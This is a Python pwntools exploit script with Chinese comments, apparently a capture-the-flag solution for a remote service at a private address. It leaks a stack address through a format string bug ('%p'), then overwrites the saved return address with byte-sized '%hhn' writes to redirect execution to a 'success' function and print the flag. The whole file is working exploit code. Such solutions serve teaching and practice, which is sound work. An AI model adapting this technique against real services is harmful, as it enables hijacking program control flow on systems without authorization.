from pwn import *

# 目标程序的地址信息
host = '10.12.153.73'
port = 11628
p = remote(host, port)

# 第一步：泄露内存信息，定位目标地址
p.sendline(b'3')  # 选择触发格式化字符串漏洞的选项
payload = b"%p"   # 使用格式化符泄露栈内容
p.sendlineafter(b"Input what you want to talk: \n", payload)
p.recv()
res = p.recv().split(b'\n')
input_addr = int(res[1], 16)  # 提取内存地址

# 计算返回地址的位置
game_ret = input_addr + 0x40  # 返回地址的偏移

# 第二步：分块修改返回地址
# 修改返回地址的低字节
p.sendline(b'3')  # 再次触发漏洞
payload = b"%23c%10$hhn~" + p32(game_ret)  # 写入低字节
p.sendlineafter(b"Input what you want to talk: \n", payload)
p.recv()
p.recv()

# 修改返回地址的高字节
p.sendline(b'3')  # 继续触发漏洞
payload = b"%147c%10$hhn" + p32(game_ret + 1)  # 写入高字节
p.sendlineafter(b"Input what you want to talk: \n", payload)
p.recv()
p.recv()

# 第三步：触发跳转，调用 success 函数
p.sendline(b'4')  # 执行返回
p.recv()
flag = p.recv().decode()
print(flag)
